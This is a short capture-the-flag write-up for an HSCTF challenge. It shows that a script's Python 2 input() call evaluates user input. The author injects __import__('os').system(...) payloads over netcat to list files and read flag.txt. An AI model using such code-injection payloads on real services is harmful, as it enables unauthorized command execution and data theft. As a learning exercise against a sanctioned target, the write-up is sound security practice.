We are provided a [python script](./data/talk.py). Let's have a look at the script.
```
#!/usr/bin/env python3
from time import sleep

print("Hello!")

sleep(1)

print("Hey, can you help me out real quick.")

sleep(1)

print("I need to know your age.")

sleep(1)

print("What's your age?")

age = input("> ")

... bunch of more print statements only
```
Hmmm. Only thing where we can affect is providing the age input, and it doesn't get manipulated anywhere... Let's just test some random input.
```
$ nc misc.hsctf.com 9001
Hello!
Hey, can you help me out real quick.
I need to know your age.
What's your age?
> test
Traceback (most recent call last):
  File "talk.py", line 18, in <module>
    age = input("> ")
  File "<string>", line 1, in <module>
NameError: name 'test' is not defined
```
Lol, so the provided script mentions python3 being used, seems like challenge server uses python2.
We all know python2's input is equivalent to `eval(raw_input)`, leading to RCE on server.
```
$ nc misc.hsctf.com 9001
Hello!
Hey, can you help me out real quick.
I need to know your age.
What's your age?
> __import__('os').system('ls .')
bin
boot
dev
etc
flag.txt
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
talk.py
tmp
usr
var
Wow!
Sometimes I wish I was 0
Well, it was nice meeting you, 0-year-old.
Goodbye!

$ nc misc.hsctf.com 9001
Hello!
Hey, can you help me out real quick.
I need to know your age.
What's your age?
> __import__('os').system('cat flag.txt')
hsctf{plz_u5e_pyth0n_3}
Wow!
Sometimes I wish I was 0
Well, it was nice meeting you, 0-year-old.
Goodbye
```
